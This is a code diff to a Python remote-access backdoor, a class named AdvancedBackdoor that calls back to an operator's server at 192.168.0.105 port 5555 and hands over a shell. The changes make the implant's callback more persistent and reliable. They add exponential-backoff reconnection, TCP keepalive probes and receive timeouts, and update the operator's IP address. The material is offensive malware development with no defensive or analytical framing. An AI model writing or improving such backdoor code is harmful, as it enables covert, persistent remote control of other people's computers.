@@ -31,6 +31,12 @@ except ImportError:
     ENCRYPTED = False
 # ─────────────────────────────────────────────────────────────────────────────
 
+# ─── Reconnect settings ───────────────────────────────────────────────────────
+_RECONNECT_DELAY_INIT = 5     # seconds before first retry
+_RECONNECT_DELAY_MAX  = 60    # cap for exponential backoff
+_RECV_TIMEOUT         = 120   # seconds recv() waits before assuming server dead
+# ─────────────────────────────────────────────────────────────────────────────
+
 
 class AdvancedBackdoor:
     def __init__(self, host, port):
@@ -69,26 +75,55 @@ class AdvancedBackdoor:
                     clear = _cipher.decrypt(parsed["e"].encode())
                     return json.loads(clear.decode())
                 return parsed
+            except socket.timeout:
+                print(f"[{time.strftime('%H:%M:%S')}] [-] No data for "
+                      f"{_RECV_TIMEOUT}s — server may be down, reconnecting…")
+                return None
             except ValueError:
                 continue
             except Exception as e:
-                print(f"[-] Recv error: {e}")
+                print(f"[{time.strftime('%H:%M:%S')}] [-] Recv error: {e}")
                 return None
 
     def connection(self):
+        delay = _RECONNECT_DELAY_INIT
         while True:
             try:
                 self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                # TCP keepalive — OS probes after 30 s idle, every 10 s, 3 times
+                self.s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                try:
+                    self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE,  30)
+                    self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
+                    self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT,    3)
+                except (AttributeError, OSError):
+                    pass  # not available on all platforms
+                self.s.settimeout(30)                    # connect timeout
                 self.s.connect((self.server_ip, self.server_port))
-                print(f"[+] Connected to {self.server_ip}:{self.server_port}"
-                      f"  (encrypted={ENCRYPTED})")
+                self.s.settimeout(_RECV_TIMEOUT)         # recv timeout
+                print(f"[{time.strftime('%H:%M:%S')}] [+] Connected to "
+                      f"{self.server_ip}:{self.server_port}  encrypted={ENCRYPTED}")
+                delay = _RECONNECT_DELAY_INIT             # reset backoff on success
                 self.shell()
-            except (socket.error, ConnectionRefusedError) as e:
-                print(f"[-] {e} — retrying in 10s...")
-                time.sleep(10)
+            except KeyboardInterrupt:
+                print("\n[!] Interrupted — exiting.")
+                return
+            except socket.timeout:
+                print(f"[{time.strftime('%H:%M:%S')}] [-] Connect timed out "
+                      f"— retry in {delay}s")
+            except (ConnectionRefusedError, OSError, socket.error) as e:
+                print(f"[{time.strftime('%H:%M:%S')}] [-] "
+                      f"{type(e).__name__}: {e} — retry in {delay}s")
             except Exception as e:
-                print(f"[-] Unexpected error: {e}")
-                time.sleep(10)
+                print(f"[{time.strftime('%H:%M:%S')}] [-] Unexpected: {e} "
+                      f"— retry in {delay}s")
+            finally:
+                try:
+                    self.s.close()
+                except Exception:
+                    pass
+            time.sleep(delay)
+            delay = min(delay * 2, _RECONNECT_DELAY_MAX)  # exponential backoff
 
     # ─── File transfer ────────────────────────────────────────────────────────
 
@@ -867,6 +902,6 @@ MISC
 
 
 if __name__ == "__main__":
-    BACKDOOR_HOST = "192.168.0.102"   # ← your server IP
+    BACKDOOR_HOST = "192.168.0.105"   # ← your server IP
     BACKDOOR_PORT = 5555
     AdvancedBackdoor(BACKDOOR_HOST, BACKDOOR_PORT)
